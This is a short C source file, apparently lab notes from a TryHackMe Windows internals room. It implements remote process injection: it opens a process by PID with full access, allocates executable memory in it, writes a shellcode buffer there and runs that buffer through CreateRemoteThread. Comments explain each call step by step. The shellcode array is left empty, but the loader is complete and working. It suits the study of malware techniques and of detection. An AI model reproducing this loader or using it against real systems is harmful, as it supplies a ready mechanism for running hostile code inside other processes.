#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
}

//
// BREAKDOWN
//
// https://tryhackme.com/room/abusingwindowsinternals
//
// Open a target process with all access rights
//processHandle = OpenProcess(
//	PROCESS_ALL_ACCESS, // Defines access rights
//	FALSE, // Target handle will not be inhereted
//	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments
//);

// Allocate target process memory for the shellcode
//remoteBuffer = VirtualAllocEx(
//	processHandle, // Opened target process
//	NULL,
//	sizeof shellcode, // Region size of memory allocation
//	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
//	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
//);

// Write shellcode to allocated memory in the target process
//WriteProcessMemory(
//	processHandle, // Opened target process
//	remoteBuffer, // Allocated memory region
//	shellcode, // Data to write
//	sizeof shellcode, // byte size of data
//	NULL
//);

// Execute the shellcode using a remote thread
//remoteThread = CreateRemoteThread(
//	processHandle, // Opened target process
//	NULL,
//	0, // Default size of the stack
//	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
//	NULL,
//	0, // Ran immediately after creation
//	NULL
//);
